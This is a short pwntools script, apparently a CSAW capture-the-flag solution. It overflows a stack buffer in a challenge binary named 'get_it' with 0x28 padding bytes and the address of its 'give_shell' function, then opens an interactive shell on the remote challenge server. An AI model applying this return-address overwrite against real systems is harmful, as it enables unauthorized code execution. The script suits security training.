from pwn import *

target = ELF('get_it')

# r = process('./get_it')
r = remote('pwn.chal.csaw.io', 9001)

r.sendline('A' * 0x28 + p64(target.symbols['give_shell']))

r.interactive()
